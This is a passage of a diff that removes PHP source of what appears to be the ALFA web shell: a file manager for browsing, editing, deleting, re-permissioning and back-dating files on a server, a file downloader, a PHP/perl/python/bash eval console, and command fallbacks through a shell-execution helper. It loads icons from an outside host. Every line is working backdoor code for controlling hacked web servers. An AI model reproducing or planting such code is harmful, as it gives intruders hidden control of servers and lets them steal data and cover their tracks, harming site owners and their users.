-echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#25ff00;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#25ff00;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#25ff00;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#25ff00;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#25ff00;">'.($count_dirContent-1).'</b></span></div><div class="header">';
-if($dirContent == false){
-echo '<center><br><span style="font-size:16px;"><span style="color: red; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
-alfaFooter();
-return;
-}
-global $sort;
-$sort = array('name', 1);
-if(isset($_COOKIE["alfa_sort_by"]) && !empty($_COOKIE["alfa_sort_by"])){
-	$sort[0] = $_COOKIE["alfa_sort_by"];
-}
-if(!empty($_POST['alfa1'])) {
-if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['alfa1'], $match))
-$sort = array($match[1], (int)$match[2]);
-}
-if($alfa_files_page_number > ($files_page_count-1)){
-	$alfa_files_page_number = 1;
-}
-$checkbox_rand = rand(11111, 99999);
-echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk".$checkbox_rand."' onclick='checkBox(this);' class='chkbx'><label for='mchk".$checkbox_rand."'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
-$dirs = $files = array();
-$n = $count_dirContent;
-if($n > $alfa_limited_files && $alfa_limited_files > 0){
-	$n = ($alfa_limited_files * $alfa_files_page_number);
-	if($n > $count_dirContent){
-		$n = $count_dirContent;
-	}
-}
-$i = 0;
-if($alfa_limited_files > 0 && $alfa_files_page_number > 1){
-	$i = $alfa_limited_files * ($alfa_files_page_number - 1);
-}
-$page_builder = get_pagination_links($alfa_files_page_number,$files_page_count -1);
-$cmd_dir_backp = "";
-for(;$i<$n;$i++){
-if($cmd_dir){
-$filename = $dirContent[$i]["name"];
-$file_owner = $dirContent[$i]["owner"];
-$file_group = $dirContent[$i]["group"];
-$file_modify = @date('Y-m-d H:i:s', $dirContent[$i]["modify"]);
-$file_perm = alfaPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
-$file_size = $dirContent[$i]["size"];
-if(substr($dirContent[$i]["name"], 0 ,1) == "/"){
-$file_path = $dirContent[$i]["name"];
-$dirContent[$i]["name"] = "..";
-$filename = $dirContent[$i]["name"];
-}else{
-$file_path = $GLOBALS['cwd']."/".$dirContent[$i]["name"];
-}
-}else{
-$filename = $dirContent[$i];
-$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($GLOBALS['cwd'].$filename)):array("name" => "????");
-$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($GLOBALS['cwd'].$filename)):array("name" => "????");
-$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($GLOBALS['cwd'].$filename):"????");
-$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($GLOBALS['cwd'].$filename):"????");
-$file_modify = @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $filename));
-$file_perm = alfaPermsColor($GLOBALS['cwd'].$filename);
-$file_size = @filesize($GLOBALS['cwd'].$filename);
-$file_path = $GLOBALS['cwd'].$filename;
-}
-$tmp = array('name' => $filename,
-'path' => $file_path,
-'modify' => $file_modify,
-'perms' => $file_perm,
-'size' => $file_size,
-'owner' => $file_owner,
-'group' => $file_group
-);
-if($filename == ".." && !$cmd_dir){
-	$tmp["path"] = str_replace("\\", "/", realpath($file_path));
-}
-if(!$cmd_dir){
-if(@is_file($file_path)){
-$arr_mrg = array('type' => 'file');
-if(@is_link($file_path)){
-$arr_mrg["link"] = readlink($tmp['path']);
-}
-$files[] = array_merge($tmp, $arr_mrg);
-}elseif(@is_link($file_path)){
-$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
-}elseif(@is_dir($file_path)&& ($filename != ".")){
-$dirs[] = array_merge($tmp, array('type' => 'dir'));
-}
-}else{
-	if($dirContent[$i]["type"]=="file"){
-		$files[] = array_merge($tmp, array('type' => 'file'));
-	}else{
-		if($dirContent[$i]["name"] != "."){
-			$dirs[] = array_merge($tmp, array('type' => 'dir'));
-		}
-	}
-}
-}
-$GLOBALS['sort'] = $sort;
-function alfaCmp($a, $b) {
-if($GLOBALS['sort'][0] != 'size')
-return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
-else
-return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
-}
-usort($files, "alfaCmp");
-usort($dirs, "alfaCmp");
-if(isset($_COOKIE["alfa_filesman_direction"])&& !empty($_COOKIE["alfa_filesman_direction"])){
-	if($_COOKIE["alfa_filesman_direction"] == 'desc'){
-		$files = array_reverse($files);
-		$dirs = array_reverse($dirs);
-	}
-}
-$files = array_merge($dirs, $files);
-$l=0;
-$cc=0;
-foreach($files as $f){
-$f['name'] = htmlspecialchars($f['name']);
-$newname = mb_strlen($f['name'], 'UTF-8')>60?mb_substr($f['name'], 0, 60, 'utf-8').'...':$f['name'];
-$checkbox = 'checkbox_'.$checkbox_rand.$cc;
-$raw_name = rawurlencode($f['name']);
-$icon = $GLOBALS['DB_NAME']['show_icons']?'<img src="'.findicon($f['name'],$f['type']).'" width="30" height="30">':'';
-$style = $GLOBALS['DB_NAME']['show_icons']?'position:relative;display:inline-block;bottom:12px;':'';
-echo '<tr class="fmanager-row" id="tr_row_'.$cc.'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$raw_name.'" class="chkbx" id="'.$checkbox .'"><label for="'.$checkbox .'"></label></div></td><td id="td_row_'.$cc.'">'.$icon.'<div style="'.$style.'"><a row="'.$cc.'" id="id_'.$cc.'" class="main_name" onclick="'.(($f['type']=='file')?'editor(\''.$raw_name.'\',\'auto\',\'\',\'\',\'\',\''.$f['type'].'\');" href="#action=fileman&path='.$GLOBALS['cwd'].'&file='.$raw_name.'" fname="'.$raw_name.'" ftype="file" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'>'.($GLOBALS['cwd'].$f['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$f['name']."</span>":htmlspecialchars($newname)):'g(\'FilesMan\',\''.$f['path'].'\');" href="#action=fileman&path='.$f['path'].'" fname="'.$raw_name.'" ftype="folder" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($f['type']=='file')?(isset($f['link'])?'[L] ':'').alfaSize($f['size']):$f['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$f['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$f['owner'].'/'.$f['group'].'</span></td><td><a id="id_chmode_'.$cc.'" href=javascript:void(0) onclick="editor(\''.$raw_name.'\',\'chmod\',\'\',\'\',\'\',\''.$f['type'].'\')">'.
-$f['perms'].'</td><td><a id="id_rename_'.$cc.'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'rename\',\'\',\'\',\'\',\''.$f['type'].'\')">R</a> <a id="id_touch_'.$cc.'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'touch\',\'\',\'\',\'\',\''.$f['type'].'\')">T</a>'.(($f['type']=='file')?' <a id="id_edit_'.$cc.'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'edit\',\'\',\'\',\'\',\''.$f['type'].'\')">E</a> <a id="id_download_'.$cc.'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$raw_name.'\', \'download\')">D</a>':'').'<a id="id_delete_'.$cc.'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '.addslashes(rawurldecode($f['name'])).' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \''.$raw_name.'\') : \'\';"> X </a></td></tr>';
-$l = $l?0:1;
-$cc++;
-}
-echo "<tr id='filemanager_last_tr'><td colspan=7>
-<input type=hidden name=a value='FilesMan'>
-<input type=hidden name=c value='".htmlspecialchars(($GLOBALS['glob_chdir_false']?$_POST['c']:$GLOBALS['cwd']))."'>
-<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
-<select id='tools_selector' name='alfa1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
-<input type='submit' value=' '>
-</form></table><div class='pages-holder'><div class='pages-number'>".$page_builder."</div></div></div></div>";
-alfafooter();
-}
-function get_pagination_links($current_page, $total_pages){
-    $links = "";
-    if ($total_pages >= 1 && $current_page <= $total_pages) {
-		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
-		$selected_page = "";
-		if($current_page == 1){
-			$selected_page = " active-page-number";
-		}
-        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">1</a>";
-        $i = max(2, $current_page - 5);
-        if ($i > 2)
-            $links .= "<a class=\"page-number\">...</a>";
-        for (; $i < min($current_page + 6, $total_pages); $i++) {
-			if($i == $current_page){
-				$selected_page = " active-page-number";
-			}else{
-				$selected_page = "";
-			}
-            $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$i}</a>";
-        }
-        if ($i != $total_pages)
-            $links .= "<a class=\"page-number\">...</a>";
-		$selected_page = " last-page-number";
-		if($current_page == $total_pages){
-			$selected_page .= " active-page-number";
-		}
-        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$total_pages}</a>";
-		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
-    }
-    return $links;
-}
-function alfaFilesTools(){
-alfahead();
-echo '<div class="filestools" style="height: 100%;">';
-if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
-$alfa1_decoded = $_POST['alfa1'];
-$chdir_fals = false;
-if(!@chdir($_POST['c'])){
-	$chdir_fals = true;
-	$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
-	$alfa_canruncmd = _alfa_can_runCommand(true,true);
-	if($alfa_canruncmd){
-		$slashed_alfa1 = addslashes($_POST['alfa1']);
-		$file_info = explode(":", alfaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_alfa1.'"'));
-		$perm_color_class = alfaEx("if [[ -w '".$slashed_alfa1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_alfa1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
-	}
-}
-if($_POST['alfa2'] == 'auto'){
-if(is_array(@getimagesize($_POST['alfa1']))){
-$_POST['alfa2'] = 'image';
-}else{
-	$_POST['alfa2'] = 'view';
-	if($chdir_fals){
-		if($alfa_canruncmd){
-			$mime = explode(":", alfaEx("file --mime-type '".addslashes($_POST['alfa1'])."'"));
-			$mimetype = $mime[1];
-			if(!empty($mimetype)){
-				if(strstr($mimetype, "image")){
-					$_POST['alfa2'] = 'image';
-				}
-			}
-		}
-	}
-}
-}
-if($_POST['alfa2'] == "rename" && !empty($_POST['alfa3']) && @is_writable($_POST['alfa1'])){$rename_cache = $_POST['alfa3'];}
-if(@$_POST['alfa2'] == 'mkfile'){
-$_POST['alfa1'] = trim($_POST['alfa1']);
-if($chdir_fals&&$alfa_canruncmd){
-	if(_alfa_is_writable($_POST["c"])){
-		alfaEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($alfa1_decoded)."'");
-		$_POST['alfa2'] = "edit";
-	}
-}
-if(!@file_exists($_POST['alfa1'])){
-$fp = @fopen($_POST['alfa1'], 'w');
-if($fp){
-$_POST['alfa2'] = "edit";
-fclose($fp);
-}
-}else{
-$_POST['alfa2'] = "edit";
-}
-}
-if(!_alfa_file_exists(@$_POST['alfa1'])){
-echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['alfa4']."');</script>";
-alfaFooter();
-return;
-}
-if($chdir_fals){
-$filesize = $file_info[3];
-$uid["name"] = $file_info[1];
-$gid["name"] = $file_info[2];
-$permcolor = alfaPermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
-}else{
-$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['alfa1'])):'';
-$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['alfa1'])):'';
-if(!$uid&&!$gid){
-$uid['name'] = function_exists("fileowner")?@fileowner($_POST['alfa1']):'';
-$gid['name'] = function_exists("filegroup")?@filegroup($_POST['alfa1']):'';
-}
-$permcolor = alfaPermsColor($_POST['alfa1']);
-$filesize = @filesize($_POST['alfa1']);
-if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
-	if(_alfa_can_runCommand()){
-		list($uid['name'],$gid['name']) = explode(":", alfaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["alfa1"]).'"'));
-	}
-}
-}
-if(substr($_POST['alfa1'], 0, 7) == "phar://"){
-	$alfa_file_directory = $_POST['alfa1'];
-}else{
-	$alfa_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['alfa1']);
-}
-echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($alfa1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.alfaSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($alfa_file_directory).'</div>';
-if(empty($_POST['alfa2']))$_POST['alfa2'] = 'view';
-if(!_alfa_is_dir($_POST['alfa1'])){
-$m = array('View', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
-$ftype = "file";
-}else{
-$m = array('Chmod', 'Rename', 'Touch');
-$ftype = "dir";
-}
-echo('<div>');
-foreach($m as $v)
-echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
-echo '</div>';
-switch($_POST['alfa2']){
-case 'view':case 'edit':
-@chdir($_POST['c']);
-$disabled_btn = "";
-if(!@is_writable($_POST['alfa1'])&&!_alfa_is_writable($_POST['alfa1'])){
-$disabled_btn = "disabled=disabled";
-$disabled_btn_style= 'background: #ff0000;color: #fff;';
-}
-if(!empty($_POST['alfa3'])){
-$_POST['alfa3'] = substr($_POST['alfa3'],1);
-$time = @filemtime($_POST['alfa1']);
-$fp = @__write_file($_POST['alfa1'],$_POST['alfa3']);
-if($chdir_fals&&$alfa_canruncmd){
-	$rname = $alfa1_decoded;
-	$randname = $rname.rand(111,9999);
-	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
-	if($fp = @__write_file($filepath ,$_POST['alfa3'])){
-		alfaEx("mv '".addslashes($filepath)."' '".addslashes($_POST["alfa1"])."';rm -f '".addslashes($filepath)."'");
-	}
-}
-if($fp){
-echo 'Saved!<br>';
-@touch($_POST['alfa1'],$time,$time);
-}
-}
-echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._alfa_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="alfaAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = alfa_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($alfa1_decoded).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$disabled_btn_style.'" '.$disabled_btn.'>save</button></div><pre class="ml1 view_ml_content">';
-echo htmlspecialchars(__read_file($_POST['alfa1']));
-echo '</pre></div></div>';
-break;
-case 'highlight':
-@chdir($_POST['c']);
-if(@is_readable($_POST['alfa1'])){
-echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;">';
-$code = @highlight_file($_POST['alfa1'],true);
-echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div></div></div>';
-}
-break;
-case 'delete':
-@chdir($_POST['c']);
-if(@is_writable($_POST['alfa1'])||$GLOBALS["glob_chdir_false"]){
-$deleted = true;
-if(!@unlink($_POST['alfa1'])){
-	$deleted = false;
-	if($alfa_canruncmd){
-		if(_alfa_is_writable($_POST['alfa1'])){
-			alfaEx("rm -f '".addslashes($_POST['alfa1'])."'");
-			$deleted = true;
-		}
-	}
-}
-if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['alfa4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['alfa4'].'"];</script>';else echo 'Error...';}
-break;
-case 'chmod':
-@chdir($_POST['c']);
-if(!empty($_POST['alfa3'])){
-$perms = 0;
-for($i=strlen($_POST['alfa3'])-1;$i>=0;--$i)
-$perms += (int)$_POST['alfa3'][$i]*pow(8, (strlen($_POST['alfa3'])-$i-1));
-if(!@chmod($_POST['alfa1'], $perms)){
-if($chdir_fals&&$alfa_canruncmd){
-alfaEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['alfa3'])." '".addslashes($alfa1_decoded)."'");
-echo('Success!');
-}else{
-echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.alfa3.value="";</script>';}
-}else{echo('Success!');}
-}
-clearstatcache();
-AlfaNum(8,9,10,7,6,5,4,2,1);
-if($chdir_fals){
-	$file_perm = $file_info[5];
-}else{
-	$file_perm = substr(sprintf('%o', @fileperms($_POST['alfa1'])),-4);
-}
-echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
-break;
-case 'hexdump':
-@chdir($_POST['c']);
-$c = __read_file($_POST['alfa1']);
-$n = 0;
-$h = array('00000000<br>','','');
-$len = strlen($c);
-for ($i=0; $i<$len; ++$i) {
-$h[1] .= sprintf('%02X',ord($c[$i])).' ';
-switch ( ord($c[$i]) ) {
-case 0: $h[2] .= ' '; break;
-case 9: $h[2] .= ' '; break;
-case 10: $h[2] .= ' '; break;
-case 13: $h[2] .= ' '; break;
-default: $h[2] .= $c[$i]; break;
-}
-$n++;
-if ($n == 32) {
-$n = 0;
-if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
-$h[1] .= '<br>';
-$h[2] .= "\n";
-}
-}
-echo '<div class="editor-view"><div class="view-content"><table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table></div></div>';
-break;
-case 'rename':
-@chdir($_POST['c']);
-$alfa1_escape = addslashes($_POST["alfa1"]);
-$alfa3_escape = addslashes($_POST["alfa3"]);
-if(!empty($_POST['alfa3'])){
-$cmd_rename = false;
-if($chdir_fals&&$alfa_canruncmd){
-if(_alfa_is_writable($_POST['alfa1'])){
-$alfa1_escape = addslashes($alfa1_decoded);
-alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa3'])."'");
-}else{
-$cmd_rename = true;
-}
-}else{
-$alfa1_escape = addslashes($_POST["alfa1"]);
-}
-if(!@rename($_POST['alfa1'], $_POST['alfa3'])&&$cmd_rename){
-echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$alfa3_escape.'\',\''.$ftype.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$alfa3_escape.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$alfa3_escape.'";updateFileEditor("'.$alfa1_escape.'", "'.$alfa3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$alfa1_escape."');":"").'}catch(e){console.log(e)}</script>');$alfa1_escape = $alfa3_escape;}
-}
-echo '<form onsubmit="editor(\''.$alfa1_escape.'\',\''.$_POST['alfa2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['alfa3'])&&$_POST['alfa3']!=''?$_POST['alfa3']:$alfa1_decoded)).'"><input type=submit value=" "></form>';
-break;
-case 'touch':
-@chdir($_POST['c']);
-if( !empty($_POST['alfa3']) ) {
-$time = strtotime($_POST['alfa3']);
-if($time){
-$touched = false;
-if($chdir_fals&&$alfa_canruncmd){
-	alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa3']))."' '".addslashes($alfa1_decoded)."'");
-	$touched = true;
-}
-if(!@touch($_POST['alfa1'],$time,$time)&&!$touched)
-echo 'Fail!';
-else
-echo 'Touched!';
-} else echo 'Bad time format!';
-}
-clearstatcache();
-echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['alfa1']))).'"><input type=submit value=" "></form>';
-break;
-case 'image':
-@chdir($_POST['c']);
-echo('<hr>');
-$file = $_POST['alfa1'];
-$image_info = @getimagesize($file);
-if(is_array($image_info)||$chdir_fals){
-$width = (int)$image_info[0];
-$height = (int)$image_info[1];
-if($chdir_fals&&$alfa_canruncmd){
-	$source = alfaEx("cat '".addslashes($file)."' | base64");
-	list($width, $height) = explode(":", alfaEx("identify -format '%w:%h' '".addslashes($file)."'"));
-	$mime = explode(":", alfaEx("file --mime-type '".addslashes($file)."'"));
-	$image_info['mime'] = $mime[1];
-}else{
-	$source = __ZW5jb2Rlcg(__read_file($file, false));
-}
-$image_info_h = "Image type = <span>[</span> ".$image_info['mime']." <span>]</span><br>Image Size = <span>[ </span>".$width." x ".$height."<span> ]</span><br>";
-if($width > 800){$width = 800;}
-echo $content = "<div class='editor-view'><div class='view-content'><center>".$image_info_h."<br><img id='viewImage' style='max-width:100%;border:1px solid green;' src='data:".$image_info['mime'].";base64,".$source."' alt='".$file."'></center></div></div><br>";
-}
-break;
-}
-echo '</div>';
-alfaFooter();
-}
-function findicon($file,$type){
-$s = 'http://solevisible.com/icons/';
-$types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
-if($type!='file'){
-return ($file=='..'?$s.'back.png':$s.'folder.png');
-}else{
-$ext = explode('.',$file);
-$ext = end($ext);
-$ext = strtolower($ext);
-return (in_array($ext,$types)?$s.$ext.'.png':$s.'notfound.png');
-}
-}
-function alfadlfile(){
-if(isset($_POST['c'],$_POST['file'])){
-$basename = rawurldecode(basename($_POST['file']));
-$_POST['file'] = str_replace("//", "/", $_POST['c'].'/'.$basename);
-$alfa_canruncmd = _alfa_can_runCommand(true,true);
-if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $alfa_canruncmd){
-ob_start("ob_gzhandler", 4096);
-header("Content-Disposition: attachment; filename=\"".addslashes($basename)."\"");
-header("Content-Type: application/octet-stream");
-if($GLOBALS["glob_chdir_false"]){
-	$randname = $basename.rand(111,9999);
-	$scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
-	$filepath = $scriptpath."/".$randname;
-	if(_alfa_is_writable($scriptpath)){
-		alfaEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
-		readfile($filepath);
-		@unlink($filepath);
-	}else{
-		alfaEx("cat '".addslashes($_POST["file"])."'");
-	}
-}else{
-	readfile($_POST['file']);
-}
-}else echo('Error...!');}}
-function __alfa_set_cookie($key, $value){
-	$_COOKIE[$key] = $value;
-	@setcookie($key, $value, time()+(86400 * 7), '/');
-}
-function alfaphpeval(){
-if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
-	$tempdir = $_COOKIE["eval_tmpdir"];
-}else{
-	$tempdir = dirname(alfaEx("mktemp"));
-	__alfa_set_cookie("eval_tmpdir", $tempdir);
-}
-alfahead();
-if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'ini')){
-echo '<div class=header>';
-ob_start();
-$INI=ini_get_all();
-print '<table border=0><tr>'
-.'<td class="listing"><font class="highlight_txt">Param</td>'
-.'<td class="listing"><font class="highlight_txt">Global value</td>'
-.'<td class="listing"><font class="highlight_txt">Local Value</td>'
-.'<td class="listing"><font class="highlight_txt">Access</td></tr>';
-foreach ($INI as $param => $values)
-print "\n".'<tr>'
-.'<td class="listing"><b>'.$param.'</td>'
-.'<td class="listing">'.$values['global_value'].' </td>'
-.'<td class="listing">'.$values['local_value'].' </td>'
-.'<td class="listing">'.$values['access'].' </td></tr>';
-$tmp = ob_get_clean();
-$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
-$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
-echo str_replace('<h1','<h2', $tmp) .'</div><br>';
-}
-if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'info')) {
-echo '<div class=header><style>.p {color:#000;}</style>';
-ob_start();
-phpinfo();
-$tmp = ob_get_clean();
-$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
-$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
-echo str_replace('<h1','<h2', $tmp) .'</div><br>';
-}
-if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'exten')) {
-echo '<div class=header>';
-ob_start();
-$EXT=get_loaded_extensions();
-echo '<table border=0><tr><td class="listing">'.implode('</td></tr>'."\n".'<tr><td class="listing">', $EXT).'</td></tr></table>'.count($EXT).' extensions loaded';
-echo '</div><br>';
-}
-$lang_html = "";
-foreach(array("php"=>"php ~> [ Windows / Linux ]","perl"=>"perl ~> [ Linux ]","python"=>"python ~> [ Linux ]","bash"=>"bash ~> [ Linux ]") as $key=>$val){$lang_html .= '<option value="'.$key.'" '.($_POST["alfa3"]==$key?"selected":"").'>'.$val.'</option>';}
